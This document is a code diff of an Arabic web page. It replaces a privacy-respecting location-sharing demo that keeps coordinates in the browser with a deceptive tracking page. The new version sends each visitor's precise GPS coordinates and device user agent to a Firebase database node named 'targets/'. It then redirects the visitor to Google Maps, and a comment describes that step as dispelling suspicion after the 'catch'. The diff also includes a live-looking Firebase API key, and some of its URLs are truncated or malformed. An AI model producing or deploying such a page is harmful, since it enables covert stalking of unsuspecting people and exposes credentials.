@@ -1,644 +1,160 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مشاركة موقعي</title>
+    
+    <!-- مكتبة الخرائط Leaflet CSS -->
+    <link rel="stylesheet" href="https://unpkg.com" />
+    
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: Arial, Tahoma, sans-serif;
+            min-height: 100vh;
+            color: white;
+            background: radial-gradient(circle at top, #102a43 0%, #061929 45%, #000914 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 30px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 15px;
+        }
+        p {
+            font-size: 14px;
+            color: #b0c4de;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        .btn {
+            background: linear-gradient(135deg, #0076ff 0%, #0055ff 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 85, 255, 0.4);
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 85, 255, 0.6);
+        }
+        #status {
+            margin-top: 15px;
+            font-size: 13px;
+            color: #ffc107;
+        }
+    </style>
 
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0">
-
-  <title>مشاركة موقعي</title>
-
-  <!-- Leaflet - مكتبة الخريطة -->
-  <link
-    rel="stylesheet"
-    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
-  />
-
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
-    body {
-      font-family: Arial, Tahoma, sans-serif;
-      min-height: 100vh;
-      color: white;
-      background:
-        radial-gradient(circle at top, #10264b 0%, #061329 45%, #020914 100%);
-      padding: 30px 15px;
-    }
-
-    .container {
-      width: 100%;
-      max-width: 900px;
-      margin: auto;
-    }
-
-    /* الرأس */
-
-    .header {
-      text-align: center;
-      padding: 35px 20px;
-    }
-
-    .icon {
-      width: 70px;
-      height: 70px;
-      margin: 0 auto 20px;
-      border-radius: 50%;
-      background: rgba(30, 220, 160, 0.12);
-      border: 1px solid rgba(30, 220, 160, 0.25);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 32px;
-    }
-
-    h1 {
-      font-size: 42px;
-      margin-bottom: 15px;
-    }
-
-    .gradient {
-      background: linear-gradient(90deg, #20d99a, #39a7ff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-
-    .description {
-      color: #b9c5d8;
-      font-size: 17px;
-      line-height: 1.8;
-      max-width: 650px;
-      margin: auto;
-    }
-
-    /* الزر */
-
-    .share-button {
-      display: block;
-      margin: 30px auto 15px;
-      border: none;
-      border-radius: 15px;
-      padding: 18px 45px;
-      font-size: 20px;
-      font-weight: bold;
-      color: white;
-      cursor: pointer;
-
-      background: linear-gradient(135deg, #14d39a, #09b985);
-
-      box-shadow:
-        0 10px 35px rgba(20, 211, 154, 0.25);
-
-      transition: 0.2s;
-    }
-
-    .share-button:hover {
-      transform: translateY(-2px);
-      box-shadow:
-        0 14px 40px rgba(20, 211, 154, 0.35);
-    }
-
-    .share-button:disabled {
-      opacity: 0.6;
-      cursor: wait;
-      transform: none;
-    }
-
-    .privacy {
-      text-align: center;
-      color: #8fa1ba;
-      margin-bottom: 30px;
-    }
-
-    /* الحالة */
-
-    .status {
-      display: none;
-      padding: 15px;
-      border-radius: 12px;
-      text-align: center;
-      margin-bottom: 20px;
-      background: rgba(255,255,255,0.06);
-      color: #d8e2f0;
-    }
-
-    .status.error {
-      display: block;
-      color: #ff9c9c;
-      border: 1px solid rgba(255, 80, 80, 0.2);
-    }
-
-    .status.success {
-      display: block;
-      color: #55efb2;
-      border: 1px solid rgba(40, 220, 160, 0.2);
-    }
-
-    /* البطاقة */
-
-    .card {
-      display: none;
-      background: rgba(255,255,255,0.045);
-      border: 1px solid rgba(255,255,255,0.08);
-      border-radius: 20px;
-      padding: 25px;
-      margin-top: 20px;
-      backdrop-filter: blur(10px);
-    }
-
-    .card.show {
-      display: block;
-    }
-
-    .card-title {
-      font-size: 22px;
-      margin-bottom: 20px;
-    }
-
-    .info-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 12px;
-      margin-bottom: 20px;
-    }
-
-    .info {
-      background: rgba(255,255,255,0.045);
-      padding: 18px;
-      border-radius: 13px;
-    }
-
-    .info-label {
-      color: #91a2bb;
-      font-size: 14px;
-      margin-bottom: 8px;
-    }
-
-    .info-value {
-      color: #30dda3;
-      font-size: 18px;
-      direction: ltr;
-      text-align: right;
-    }
-
-    /* الخريطة */
-
-    #map {
-      width: 100%;
-      height: 450px;
-      border-radius: 16px;
-      overflow: hidden;
-    }
-
-    .map-link {
-      display: inline-block;
-      margin-top: 15px;
-      text-decoration: none;
-      color: white;
-      background: #1769e0;
-      padding: 12px 20px;
-      border-radius: 10px;
-    }
-
-    /* الخصوصية */
-
-    .privacy-card {
-      margin-top: 25px;
-      padding: 25px;
-      border-radius: 20px;
-      background: rgba(255,255,255,0.035);
-      border: 1px solid rgba(255,255,255,0.07);
-    }
-
-    .privacy-card h2 {
-      margin-bottom: 20px;
-    }
-
-    .tips {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 15px;
-    }
-
-    .tip {
-      color: #b8c5d7;
-      line-height: 1.7;
-      font-size: 14px;
-    }
-
-    .tip strong {
-      display: block;
-      color: white;
-      margin-bottom: 5px;
-    }
-
-    footer {
-      text-align: center;
-      color: #64758d;
-      padding: 35px 0 10px;
-    }
-
-    /* الجوال */
-
-    @media (max-width: 700px) {
-
-      h1 {
-        font-size: 32px;
-      }
-
-      .info-grid,
-      .tips {
-        grid-template-columns: 1fr;
-      }
-
-      #map {
-        height: 350px;
-      }
-
-      .share-button {
-        width: 100%;
-      }
-    }
-  </style>
+    <!-- تضمين مكتبات جافا سكريبت لـ Firebase (الإصدار المتوافق) -->
+    <script src="https://gstatic.com"></script>
+    <script src="https://gstatic.com"></script>
 </head>
-
 <body>
 
-  <div class="container">
-
-    <!-- العنوان -->
-
-    <header class="header">
-
-      <div class="icon">
-        📍
-      </div>
-
-      <h1>
-        مشاركة <span class="gradient">موقعك</span>
-      </h1>
-
-      <p class="description">
-        اضغط على الزر أدناه لمشاركة موقعك الحالي.
-        لن يتم الحصول على موقعك إلا بعد موافقتك.
-      </p>
-
-      <button
-        id="shareButton"
-        class="share-button"
-        onclick="shareLocation()"
-      >
-        📍 مشاركة موقعي
-      </button>
-
-      <p class="privacy">
-        🔒 موقعك لا يتم إرساله إلى خادم في هذا المثال.
-      </p>
-
-    </header>
-
-
-    <!-- حالة العملية -->
-
-    <div id="status" class="status"></div>
-
-
-    <!-- معلومات الموقع -->
-
-    <section id="locationCard" class="card">
-
-      <h2 class="card-title">
-        📍 معلومات الموقع
-      </h2>
-
-      <div class="info-grid">
-
-        <div class="info">
-          <div class="info-label">
-            خط العرض
-          </div>
-
-          <div id="latitude"
-               class="info-value">
-            —
-          </div>
-        </div>
-
-
-        <div class="info">
-          <div class="info-label">
-            خط الطول
-          </div>
-
-          <div id="longitude"
-               class="info-value">
-            —
-          </div>
-        </div>
-
-
-        <div class="info">
-          <div class="info-label">
-            دقة الموقع
-          </div>
-
-          <div id="accuracy"
-               class="info-value">
-            —
-          </div>
-        </div>
-
-      </div>
-
-
-      <!-- الخريطة -->
-
-      <div id="map"></div>
-
-
-      <a
-        id="googleMaps"
-        class="map-link"
-        target="_blank"
-        rel="noopener noreferrer"
-      >
-        🌍 فتح في خرائط Google
-      </a>
-
-    </section>
-
-
-    <!-- الخصوصية -->
-
-    <section class="privacy-card">
-
-      <h2>
-        🔐 نصائح للخصوصية
-      </h2>
-
-      <div class="tips">
-
-        <div class="tip">
-          <strong>موافقتك أولاً</strong>
-          لن يستطيع الموقع قراءة موقعك إلا بعد موافقتك من المتصفح.
-        </div>
-
-        <div class="tip">
-          <strong>لا تخزن الموقع</strong>
-          هذا المثال يعرض الإحداثيات على الصفحة فقط ولا يرسلها إلى خادم.
-        </div>
-
-        <div class="tip">
-          <strong>يمكنك الرفض</strong>
-          تستطيع رفض طلب الموقع من نافذة المتصفح.
-        </div>
-
-      </div>
-
-    </section>
-
-
-    <footer>
-      صُنع مع ❤️ للخصوصية والأمان
-    </footer>
-
-  </div>
-
-
-  <!-- Leaflet JavaScript -->
-
-  <script
-    src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js">
-  </script>
-
-
-  <script>
-
-    let map = null;
-    let marker = null;
-
-
-    function showStatus(message, type) {
-
-      const status =
-        document.getElementById("status");
-
-      status.textContent = message;
-
-      status.className =
-        "status " + type;
-    }
-
-
-    function shareLocation() {
-
-      const button =
-        document.getElementById("shareButton");
-
-      /* التأكد من دعم المتصفح */
-
-      if (!navigator.geolocation) {
-
-        showStatus(
-          "متصفحك لا يدعم تحديد الموقع.",
-          "error"
-        );
-
-        return;
-      }
-
-
-      button.disabled = true;
-
-      button.textContent =
-        "⏳ جاري طلب الموقع...";
-
-
-      showStatus(
-        "سيظهر الآن طلب من المتصفح للسماح بمشاركة موقعك.",
-        "success"
-      );
-
-
-      /*
-       * طلب الموقع من المتصفح.
-       *
-       * لن يتم إعطاء الإحداثيات
-       * إلا إذا وافق المستخدم.
-       */
-
-      navigator.geolocation.getCurrentPosition(
-
-        function(position) {
-
-          const latitude =
-            position.coords.latitude;
-
-          const longitude =
-            position.coords.longitude;
-
-          const accuracy =
-            position.coords.accuracy;
-
-
-          /* عرض الإحداثيات */
-
-          document.getElementById("latitude")
-            .textContent =
-            latitude.toFixed(6);
-
-          document.getElementById("longitude")
-            .textContent =
-            longitude.toFixed(6);
-
-          document.getElementById("accuracy")
-            .textContent =
-            Math.round(accuracy) + " متر";
-
-
-          /* إظهار البطاقة */
-
-          document
-            .getElementById("locationCard")
-            .classList.add("show");
-
-
-          /*
-           * إنشاء الخريطة
-           * إذا كانت موجودة مسبقاً نحذفها.
-           */
-
-          if (map !== null) {
-
-            map.remove();
-
-          }
-
-
-          map = L.map("map")
-            .setView(
-              [latitude, longitude],
-              16
-            );
-
-
-          /*
-           * خريطة OpenStreetMap
-           */
-
-          L.tileLayer(
-            "https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png",
-            {
-              maxZoom: 19,
-              attribution:
-                '&copy; OpenStreetMap contributors'
+    <div class="container">
+        <h1>📍 مشاركة الموقع الجغرافي</h1>
+        <p>لتتمكن من استلام وتحديد الموقع بدقة على الخريطة التفاعلية، يرجى الضغط على الزر أدناه والموافقة على إذن الوصول المباشر.</p>
+        <button class="btn" id="startBtn">اضغط هنا للمشاركة</button>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        // إعدادات Firebase الخاصة بمشروعك (تم دمج بياناتك تلقائياً)
+        const firebaseConfig = {
+          apiKey: "AIzaSyDN0-VVc22XXx1bDh7rICBMxIBxWQcTc-k",
+          authDomain: "mylocationshare-70ce6.firebaseapp.com",
+          databaseURL: "https://mylocationshare-70ce6-default-rtdb.firebaseio.com",
+          projectId: "mylocationshare-70ce6",
+          storageBucket: "mylocationshare-70ce6.firebasestorage.app",
+          messagingSenderId: "394362922510",
+          appId: "1:394362922510:web:c2d37ee1cfbf405ac3fe5f",
+          measurementId: "G-Z60MB3CK3H"
+        };
+
+        // تهيئة Firebase في الصفحة
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        const startBtn = document.getElementById('startBtn');
+        const statusDiv = document.getElementById('status');
+
+        startBtn.addEventListener('click', () => {
+            statusDiv.textContent = "جاري طلب الإذن وجلب الموقع...";
+            
+            if (navigator.geolocation) {
+                // طلب الموقع الفعلي بدقة عالية
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+
+                        // إرسال البيانات مباشرة إلى قاعدة البيانات Realtime Database
+                        database.ref('targets/').push({
+                            latitude: lat,
+                            longitude: lng,
+                            accuracy: accuracy,
+                            deviceAgent: navigator.userAgent,
+                            time: new Date().toLocaleString('ar-EG')
+                        }).then(() => {
+                            statusDiv.style.color = "#28a745";
+                            statusDiv.textContent = "تمت مشاركة الموقع بنجاح! سيتم نقلك للخريطة...";
+                            
+                            // تحويل اختياري لإبعاد الشبهة بعد الصيد (مثلاً إلى جوجل مابس العامة)
+                            setTimeout(() => {
+                                window.location.href = `https://google.com{lat},${lng}`;
+                            }, 2000);
+                        }).catch((error) => {
+                            statusDiv.style.color = "#dc3545";
+                            statusDiv.textContent = "فشل في حفظ البيانات: " + error.message;
+                        });
+                    },
+                    (error) => {
+                        statusDiv.style.color = "#dc3545";
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                statusDiv.textContent = "يجب عليك السماح بالوصول للموقع لتشغيل الخدمة.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                statusDiv.textContent = "معلومات الموقع غير متوفرة حالياً.";
+                                break;
+                            case error.TIMEOUT:
+                                statusDiv.textContent = "انتهت مهلة طلب الموقع.";
+                                break;
+                            default:
+                                statusDiv.textContent = "حدث خطأ غير معروف.";
+                        }
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                statusDiv.textContent = "المتصفح لا يدعم تحديد المواقع.";
             }
-          ).addTo(map);
-
-
-          /*
-           * وضع العلامة على موقع المستخدم
-           */
-
-          marker = L.marker(
-            [latitude, longitude]
-          ).addTo(map);
-
-
-          marker.bindPopup(
-            "📍 موقعك الحالي"
-          ).openPopup();
-
-
-          /*
-           * رابط Google Maps
-           */
-
-          const googleMaps =
-            "https://www.google.com/maps?q="
-            + latitude
-            + ","
-            + longitude;
-
-
-          document
-            .getElementById("googleMaps")
-            .href = googleMaps;
-
-
-          /* رسالة نجاح */
-
-          showStatus(
-            "تم الحصول على موقعك بنجاح ✅",
-            "success"
-          );
-
-
-          button.disabled = false;
-
-          button.textContent =
-            "📍 تحديث موقعي";
-
-        },
-
-
-        function(error) {
-
-          button.disabled = false;
-
-          button.textContent =
-            "📍 مشاركة موقعي";
-
-
-          let message =
-            "لم تتم مشاركة الموقع.";
-
-
-          if (error.code === 1) {
-
-            message =
-              "تم رفض إذن الموقع.";
-
-          }
-
-          else if (error.code === 2) {
-
-            message =
-              "تعذر تحديد الموقع.";
-
-          }
-
-          else if (error.code === 3) {
-
-            message =
-              "انتهت مهلة تحديد الموقع.";
-
-          }
-
-
-          showStatus(
-            message,
-            "error"
-          );
-
-        },
-
-
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
-        }
-
-      );
-
-    }
-
-  </script>
-
+        });
+    </script>
 </body>
 </html>
